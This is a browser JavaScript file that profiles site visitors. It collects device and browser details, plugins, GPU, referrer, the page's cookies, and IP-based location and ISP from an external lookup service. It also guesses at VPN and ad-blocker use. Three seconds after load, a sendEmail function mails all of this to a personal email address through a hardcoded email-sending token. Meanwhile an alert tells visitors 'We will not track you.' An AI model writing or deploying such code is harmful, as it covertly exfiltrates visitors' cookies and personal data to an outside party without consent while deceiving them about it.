var loadTime = window.performance.timing.domContentLoadedEventEnd- window.performance.timing.navigationStart;
var tz = "none";
window.onload = function () {
  var loadTime = window.performance.timing.domContentLoadedEventEnd-window.performance.timing.navigationStart; 
  console.log('Page load time is '+ loadTime);
}

if(navigator.cookieEnabled) {
	console.log("Cookie");
}
else {
	console.log("No Cookie");
	alert("Please enable cookies for the site to work correctly.\nWe will not track you.");
}

function getOS() {
  var userAgent = window.navigator.userAgent,
      platform = window.navigator.platform,
      macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
      windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
      iosPlatforms = ['iPhone', 'iPad', 'iPod'],
      os = null;
  if (macosPlatforms.indexOf(platform) !== -1) {
    os = 'Mac OS';
  } else if (iosPlatforms.indexOf(platform) !== -1) {
    os = 'iOS';
  } else if (windowsPlatforms.indexOf(platform) !== -1) {
    os = 'Windows';
  } else if (/Android/.test(userAgent)) {
    os = 'Android';
  } else if (!os && /Linux/.test(platform)) {
    os = 'Linux';
  }
  console.log("Operating system: " + os);
  return os;
}

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(getPosition);
  } else {
    gd += ".\nGeolocation is not supported by the user's browser";
  }
}

function getPosition(position) {
  var positionInfo = ".\nGeographical coordinates: (" + position.coords.latitude + ", " + position.coords.longitude + ")";
  positionInfo += ".\nAccuracy: " + position.coords.accuracy.toFixed(1) + "m";

  positionInfo += ".\nAltitude: ";
  if (position.coords.altitude != null) positionInfo +=  position.coords.altitude + "m";
  else positionInfo += "not available";

  positionInfo += ".\nSpeed: ";
  if (position.coords.speed != null) positionInfo += position.coords.speed + "m/s (" + position.coords.speed * 3.6 + "km/h)";
  else positionInfo += "not available";

  positionInfo += ".\nHeading: ";
  if (position.coords.heading != null) positionInfo += position.coords.heading + "degrees";
  else positionInfo += "not available";
  
  gd += positionInfo;
}

function plugns(){
  console.log("Installed plug-ins: ");
  var plugs = ".\nInstalled plug-ins: ";
  for (var i = 0; i < navigator.plugins.length; i++) {
    plugs = plugs + (i + 1) + ": " + navigator.plugins[i].name + " ";
  }
  console.log(plugs);
  return plugs;
}

function ip() {
  $.getJSON('https://json.geoiplookup.io/?callback=?', function(data) {
    console.log(JSON.stringify(data, null, 2));
    var ipa = data.ip;
    var post = data.postal_code;
    window.post = post;
    var cont = data.country_name;
    var isp = data.isp;
    window.isp = isp;
    var region = data.region;
    window.region = region;
    var tz = data.timezone_name;
    window.tz = tz;
    var currency = data.currency_name;

    console.log("Internet Service Provider (ISP): " + isp);
    console.log("IP Adress: " + ipa);
    console.log("Postal code: " + post);
    console.log("Country: " + cont);
    console.log("Region: " + region);
    console.log("Currency: " + currency + ".\n");
    var ipInfo = "";
    ipInfo += ".\nInternet Service Provider (ISP): " + isp;
    ipInfo += ".\nIP adress: " + ipa;
    ipInfo += ".\nPostal code: " + post;
    ipInfo += ".\nCountry: " + cont;
    ipInfo += ".\nRegion: " + region;
    ipInfo += ".\nCurrency: " + currency + ".\n";
    gd += ipInfo;
  });
}

function gpu(){
  var canvas = document.createElement('canvas');
  var gl;
  var debugInfo;
  var vendor;
  var renderer;
  try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  }   
  catch (e) {
  }
  if (gl) {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    console.log("GPU vendor: " + vendor);
    console.log("Renderer: " + renderer);
    render = renderer;
    window.render = render;
    window.vendor = vendor;
    if(vendor.includes("Google Inc.")) {
      var ret = vendor.replace('Google Inc.','');
      console.log("GPU: " + ret);
    }
    gd += ".\nGPU: " + ret;
    gd += ".\nRenderer: " + renderer;
    console.log(ret);
  }
  console.log(ret);
}

var gd = "";
var now = Date().toLocaleString();
var os = getOS();
var memory = window.navigator.deviceMemory;
var cpu = window.navigator.hardwareConcurrency;
var lang = window.navigator.language;
var touch = window.navigator.maxTouchPoints;
var usr = window.navigator.userAgent;
var resolution = screen.width * devicePixelRatio + "x" + screen.height * devicePixelRatio + "p";
var color = screen.colorDepth;
var pixel = screen.pixelDepth;
var cookie = document.cookie;
if (cookie == "") cookie = "no cookies";
var line = window.navigator.onLine;
var char = document.characterSet;
var ref = document.referrer;
if (ref == "") ref = "direct";

gd += "Time Visited: "+ now;
gd += ".\nOperating system: " + os;
gd += ".\nMemory: " + memory + "GB";
gd += ".\nNumber of CPU cores: " + cpu;
gd += ".\nLanguage: " + lang;
gd += ".\nTouch: " + touch;
gd += ".\nUser agent: "+ usr;
gd += ".\nScreen resolution: "+ resolution;
gd += ".\nScreen color depth: "+ color +" bits";
gd += ".\nPixel depth: "+ pixel +" bits";
gd += ".\nCookies: "+ cookie;
gd += ".\nConnected to the internet: "+ line;
gd += ".\nCharacter Encoding: "+ char;
gd += ".\nUser came from: " + ref;
gd += plugns();
ip();
detectAdBlock();
gpu();
get_login_status();
//getLocation();
//getPosition();
             
function get_login_status(network, status){
    gd += ".\nLogged into Google: " + status;
}
                 
async function detectAdBlock() {
  let adBlockEnabled = false
  const googleAdUrl = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js'
  try {
    await fetch(new Request(googleAdUrl)).catch(_ => adBlockEnabled = true)
  } catch (e) {
    adBlockEnabled = true;
    gd = gd + ".\nAdBlocker enabled: true";
  } finally {
    console.log(`AdBlock Enabled: ${adBlockEnabled}`)
    //document.getElementById("add").textContent =`AdBlock Enabled: ${adBlockEnabled}`;
    gd = gd + ".\nAdBlocker enabled: false";
  }
}   
    
function stringToUUID (str)
{
  if (str === undefined || !str.length)
    str = "" + Math.random() * new Date().getTime() + Math.random();

  let c = 0,
      r = "";

  for (let i = 0; i < str.length; i++)
    c = (c + (str.charCodeAt(i) * (i + 1) - 1)) & 0xfffffffffffff;

  str = str.substr(str.length / 2) + c.toString(16) + str.substr(0, str.length / 2);
  for(let i = 0, p = c + str.length; i < 32; i++)
  {
    if (i == 8 || i == 12 || i == 16 || i == 20)
      r += "-";

    c = p = (str[(i ** i + p + 1) % str.length]).charCodeAt(0) + p + i;
    if (i == 12)
      c = (c % 5) + 1; //1-5
    else if (i == 16)
      c = (c % 4) + 8; //8-B
    else
      c %= 16; //0-F

    r += c.toString(16);
  }
  return r;
}


function get_browser() {
  var ua=navigator.userAgent,tem,M=ua.match(/(fxios|opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || []; 
  if(/trident/i.test(M[1])){
    tem=/\brv[ :]+(\d+)/g.exec(ua) || []; 
    return {name:'IE',version:(tem[1]||'')};
  }   
  if(M[1]==='Chrome'){
      tem=ua.match(/\bOPR|Edge\/(\d+)/)
      if(tem!=null)   {return {name:'Opera', version:tem[1]};}
      }   
  M=M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
  if((tem=ua.match(/version\/(\d+)/i))!=null) {M.splice(1,1,tem[1]);}
  return {
    name: M[0],
    version: M[1]
  };
}

var browser = get_browser();

var browsern = browser.name;
var bversion = browser.version;
if(browsern == "FxiOS"){
  browsern = "Firefox On iOS";
}
console.log("Browser name + version: " + browsern + bversion);
                                            
/*html2canvas(document.body, {
onrendered: function(canvas)
{
var img = canvas.toDataURL();
$("#result-image").attr('src', img).show();
}
});*/

function shot(){
html2canvas(document.body, {
onrendered: function(canvas)
{
canvas.toBlob(function(blob) {
const blobUrl = URL.createObjectURL(blob);
//window.open(blobUrl, '_blank');
saveAs(blob, "Screenshot.png");
});
}
});
}
                                            
function getScreenRefreshRate(callback, runIndefinitely) {
	let requestId = null;
	let callbackTriggered = false;
	runIndefinitely = runIndefinitely || false;
	if (!window.requestAnimationFrame) {
		window.requestAnimationFrame = window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
	}
	let DOMHighResTimeStampCollection = [];
	let triggerAnimation = function(DOMHighResTimeStamp) {
		DOMHighResTimeStampCollection.unshift(DOMHighResTimeStamp);
		if (DOMHighResTimeStampCollection.length > 10) {
			let t0 = DOMHighResTimeStampCollection.pop();
			let fps = Math.floor(1000 * 10 / (DOMHighResTimeStamp - t0));
			if (!callbackTriggered) {
				callback.call(undefined, fps, DOMHighResTimeStampCollection);
			}
			if (runIndefinitely) {
				callbackTriggered = false;
			} else {
				callbackTriggered = true;
			}
		}
		requestId = window.requestAnimationFrame(triggerAnimation);
	};
	window.requestAnimationFrame(triggerAnimation);
	// Stop after half second if it shouldn't run indefinitely
	if (!runIndefinitely) {
		window.setTimeout(function() {
			window.cancelAnimationFrame(requestId);
			requestId = null;
		}, 500);
	}
}

function timecheck(){
  vpn = "Unable to detect";
  console.log("Timezone: " + tz);
  if(tz !="none"){
    var btz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    console.log("Browser time" + btz);
    console.log("IP Time" + tz);
    if(tz == btz){
      vpn = "false";
    }
    else{
      vpn = "true";
    }
}
  console.log("VPN: " + vpn);
  gd = gd + ".\nVPN enabled: " + vpn;
  //document.getElementById("vpntest").textContent = "VPN Enabled: "+ vpn;
}
timecheck();

viewmode = "Light";
if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
    console.log("Dark Mode");
    viewmode = "Dark"
} else console.log("Light Mode");
gd = gd + ".\nColor scheme: " + viewmode;

if(touch >=1){
  //document.getElementById("touch").textContent = "Touch Screen: True";
  console.log(touch);
}
else{
  //document.getElementById("touch").textContent = "Touch Screen: False";
  console.log(touch);
}

gd += ".\nTouch screen: " + touch;
    
//setTimeout(codingCourse, 1500);
function codingCourse() {
  gd += isp + region + post + render + vendor + browsern + bversion;
  console.log(gd);
  var uid = stringToUUID(gd);
  sessionStorage.setItem("idmove", uid);
  timecheck();
  getScreenRefreshRate(function(FPS){
  console.log(`${FPS} FPS`);
  fps = Math.round(FPS / 5) * 5;
  
  if (fps > 31  && fps <= 70) fps = 60;
  console.log(fps);

  gd += "Screen refresh rate: " + fps + "Hz";
  });
}

setTimeout(sendEmail, 3000);

function sendEmail() {
  Email.send({
    SecureToken: "ddce9da2-557b-412d-bf98-b417d022716c",
    To : 'nicolasbarbierisousa@icloud.com',
    From : "nicolasbarbierisousa@gmail.com",
    Subject : "User data",
    Body : gd
}).then(
  console.log("enviado")
);
}